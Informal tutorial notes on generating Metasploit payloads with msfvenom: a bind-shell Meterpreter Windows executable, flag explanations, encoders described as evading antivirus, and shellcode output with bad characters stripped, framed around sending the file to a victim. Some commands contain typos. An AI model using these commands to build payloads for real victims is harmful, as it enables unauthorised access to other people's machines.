Msfvenom used to generate a payload and then send link to victim machine and if he open it and execute 
then it will gave access to attacker if it is reverse shell

--------------------------------MSFVENOM PAYLOAD GENERATION-------------------------------

Generating payload for windows 32bit

mfvenom -p windows/meterpreter_bind_tcp  -a x86  -f exe -0 bind.exe --platform windows

-p is used for payload type whether it is bind or reverse 
-a is architecture like x86 is 32 bit x64 is 64 bit
-f file type you want
-o output file name you want
--platform whether it is windows or linux etc.

Msfvenom -h
 -l  is used to list all payloads encoder an other

Msfvenom -l encoder to list encoders
 encoder used to stay safe from antivirus and bad character 


Some advance command to remove bad characters:
 msfvenom -p windows/x64/meterpreter_bind_shell -b '\x00\x0d\x0a\' -k -f python
-b to remove bad character
-k to spawn
-f file type python there is also some other language like ruby ,c etc
